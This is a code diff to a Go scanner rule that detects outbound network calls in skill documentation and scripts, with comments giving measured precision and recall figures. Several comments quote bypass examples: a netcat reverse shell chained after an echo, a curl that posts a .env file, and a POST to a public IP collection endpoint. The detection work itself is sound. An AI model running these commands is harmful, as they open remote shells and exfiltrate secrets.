@@ -222,6 +222,122 @@ func shellStatement(lines [][]byte, i int) (string, int) {
 	return b.String(), written
 }
 
+// reShellChain matches the operators that put a SECOND command into a
+// statement: `&&`, `||`, `;` and a pipe. A single `&` is deliberately absent —
+// it is the query separator in every URL that carries parameters, and vetoing
+// on it measured 11 benign findings against 1 malicious one on the bench
+// corpus, which is the wrong direction. `&&` is vetoed unmasked: a URL query
+// containing `&&` is malformed, and reading one as a chain fails CLOSED
+// (the finding keeps its registered High/security), which is the safe way to
+// be wrong here. The same reasoning covers `;` and `|` inside a URL token.
+var reShellChain = regexp.MustCompile(`&&|;|\|`)
+
+// reCaptureAssignment matches an assignment whose value IS this statement's
+// own command substitution — `DATA=$(curl -s https://api.example.com/v1)`.
+// That substitution is not a second command; it is how a shell script keeps
+// the call's output. Measured: `$(` anywhere fires on 17 benign and 18
+// malicious demoted findings (flat), while restricting it to this shape
+// leaves the benign ones demoted and still vetoes a substitution that sits
+// in an ARGUMENT, which is where `curl -d "$(cat ~/.env)" …` lives.
+var reCaptureAssignment = regexp.MustCompile(`^\s*[\w.]+\s*=\s*\$\(`)
+
+// isSoleCall reports whether the statement is nothing but one call, its
+// flags and its target.
+//
+// This is an ALLOW-LIST OF FORM, and it replaced a deny-list of dangerous
+// verbs. The distinction is the whole point. A deny-list — "demote unless the
+// statement uploads a file or reads local state" — has to enumerate every
+// dangerous thing a statement can do, fails OPEN on everything it forgot, and
+// ships in a public repo where an attacker reads it. It forgot reverse shells
+// entirely: `echo "https://example.com" && nc -e /bin/sh 10.0.0.1 4444` in a
+// SKILL.md graded security A, and so did the /dev/tcp, python-socket, perl
+// and Invoke-WebRequest spellings of the same thing. An allow-list of form
+// fails CLOSED: a statement doing anything this function does not recognise
+// keeps its registered severity, and what it must recognise is one short,
+// auditable list rather than the open set of ways to be dangerous.
+//
+// Measured cost of failing closed, 906-sample slice, installed layout,
+// `--fail-on-axis security=B`: benign flagged 80 → 83, malicious 187 → 196.
+// Precision 0.7004 → 0.7025 and recall 0.6233 → 0.6533 — the escalated
+// population is 3.7:1 malicious. A carve-out for a pipe into a pure formatter
+// (`curl … | jq .`, a common README shape) was measured and NOT shipped: the
+// lines it spares are 31 malicious against 6 benign, and at the gate it buys
+// exactly one benign sample at the cost of exactly one malicious one.
+func isSoleCall(stmt string) bool {
+	if reShellChain.MatchString(stmt) {
+		return false
+	}
+	if n := strings.Count(stmt, "$("); n > 0 {
+		return n == 1 && reCaptureAssignment.MatchString(stmt)
+	}
+	return true
+}
+
+// noSuspiciousEndpoint reports whether NO url in the statement is one a
+// published service would not use. suspiciousEndpoint used to be applied to
+// `reHTTPURL.FindString(stmt)` — the FIRST url only — so in a SKILL.md
+// `curl https://api.example.com/v1 && curl -X POST http://185.220.101.5/collect`
+// graded A while the same two calls in the opposite order graded D. Argument
+// order decided the grade.
+func noSuspiciousEndpoint(stmt string) bool {
+	for _, u := range reHTTPURL.FindAllString(stmt, -1) {
+		if suspiciousEndpoint(u) {
+			return false
+		}
+	}
+	return true
+}
+
+// routableIPLiteralHost reports whether a URL's host is an IP address that
+// routes on the public internet — not loopback, not RFC1918, not link-local,
+// not multicast, not unspecified.
+//
+// Narrower than suspiciousEndpoint on purpose, because it is used where
+// suspiciousEndpoint is measurably wrong: on a bare URL in prose, with no
+// call around it. suspiciousEndpoint's whole predicate fires on 37 benign
+// and 28 malicious such lines in the bench corpus (Set A) — `http://
+// localhost:8080/` as an OAuth redirect URI, `http://127.0.0.1:18791/start`
+// as a dev server, over and over — so escalating on it would be noise on
+// both sides of the label. Restricted to a globally routable IP literal the
+// same population is 4 malicious findings across 3 samples and ZERO benign.
+// Nobody documents a bare public IP as their service address.
+func routableIPLiteralHost(raw string) bool {
+	raw = strings.Trim(raw, `"'`+"`"+`,;)`)
+	u, err := url.Parse(raw)
+	if err != nil || u.Host == "" {
+		return false
+	}
+	ip := net.ParseIP(u.Hostname())
+	if ip == nil {
+		return false
+	}
+	return !ip.IsLoopback() && !ip.IsPrivate() && !ip.IsLinkLocalUnicast() &&
+		!ip.IsLinkLocalMulticast() && !ip.IsMulticast() && !ip.IsUnspecified()
+}
+
+// hasRoutableIPLiteral reports whether any URL in the statement is addressed
+// to a globally routable IP literal.
+func hasRoutableIPLiteral(stmt string) bool {
+	for _, u := range reHTTPURL.FindAllString(stmt, -1) {
+		if routableIPLiteralHost(u) {
+			return true
+		}
+	}
+	return false
+}
+
+// runsNetworkCommand reports whether the statement runs a network command
+// that is not `git fetch`.
+//
+// The veto is applied by removing the `fetch` token from `git fetch` rather
+// than by rejecting the whole statement when `git fetch` appears anywhere in
+// it. The old whole-line form meant `git fetch origin && curl https://evil…`
+// suppressed the curl as well: a veto for one alternative of the regex
+// silenced every other alternative on the same line.
+func runsNetworkCommand(stmt string) bool {
+	return reNetworkCommand.MatchString(reGitFetch.ReplaceAllString(stmt, "git "))
+}
+
 type networkCallRule struct {
 	baseRule
 }
@@ -236,7 +352,8 @@ type networkCallRule struct {
 // same line inside a script is not a declaration: it runs. And any host that
 // a published API would not use stays High wherever it appears.
 func (r *networkCallRule) endpointFinding(ctx model.FileContext, line int, url, stmt string, declared bool, desc string) model.Finding {
-	if declared && url != "" && !suspiciousEndpoint(url) && !exfiltratesLocalData(stmt) {
+	if declared && url != "" && noSuspiciousEndpoint(stmt) &&
+		!exfiltratesLocalData(stmt) && isSoleCall(stmt) {
 		return r.newFindingAs(ctx, line, model.SeverityMedium, axes.Transparency,
 			"documented endpoint "+url,
 			"Confirm the skill's documentation matches what it actually contacts")
@@ -253,16 +370,19 @@ func (r *networkCallRule) Match(content []byte, ctx model.FileContext) []model.F
 	var findings []model.Finding
 	lines := bytes.Split(content, []byte("\n"))
 	for i := 0; i < len(lines); i++ {
-		line := lines[i]
 		lineNum := i + 1
-		// The URL frequently sits on a backslash continuation of the same
-		// command, so read it from the whole statement, not the first line —
+		// The call and its URL frequently sit on a backslash continuation of
+		// the same command, so judge the whole statement, not the first line —
 		// and skip the lines that statement consumed, or each of them is
-		// judged again as a statement of its own.
+		// judged again as a statement of its own. Matching the CALL regexes
+		// against the first line only was its own bypass: in a doc file the
+		// bare-URL fallback is deliberately silent, so
+		// `echo "https://example.com" \` + `&& nc -e /bin/sh 10.0.0.1 4444`
+		// produced no finding at all.
 		stmt, consumed := shellStatement(lines, i)
 		i += consumed - 1
 		urlMatch := reHTTPURL.FindString(stmt)
-		if reNetworkCommand.Match(line) && !reGitFetch.Match(line) {
+		if runsNetworkCommand(stmt) {
 			desc := "outbound network call detected"
 			if urlMatch != "" {
 				desc = "outbound network call to " + urlMatch
@@ -270,7 +390,7 @@ func (r *networkCallRule) Match(content []byte, ctx model.FileContext) []model.F
 			findings = append(findings, r.endpointFinding(ctx, lineNum, urlMatch, stmt, declared, desc))
 			continue
 		}
-		if reRequestsLib.Match(line) {
+		if reRequestsLib.MatchString(stmt) {
 			desc := "outbound network call via library"
 			if urlMatch != "" {
 				desc = "outbound network call via library to " + urlMatch
@@ -286,9 +406,17 @@ func (r *networkCallRule) Match(content []byte, ctx model.FileContext) []model.F
 			continue
 		}
 		switch {
+		case isDocFile(ctx.Path) && hasRoutableIPLiteral(stmt):
+			findings = append(findings, r.newFinding(ctx, lineNum,
+				"outbound network reference to "+urlMatch,
+				"Remove or restrict outbound network references; document why external access is needed"))
 		case isDocFile(ctx.Path):
-			// silent
-		case isDeclarativeFile(ctx.Path) && !suspiciousEndpoint(urlMatch):
+			// A bare URL in prose is a link. It says nothing about
+			// behaviour, and escalating it on suspiciousEndpoint's full
+			// predicate measured as noise on both sides of the label — see
+			// routableIPLiteralHost. Only the routable-IP case above is
+			// worth a finding here.
+		case isDeclarativeFile(ctx.Path) && noSuspiciousEndpoint(stmt):
 			findings = append(findings, r.newFindingAs(ctx, lineNum,
 				model.SeverityMedium, axes.Transparency,
 				"declared endpoint "+urlMatch,
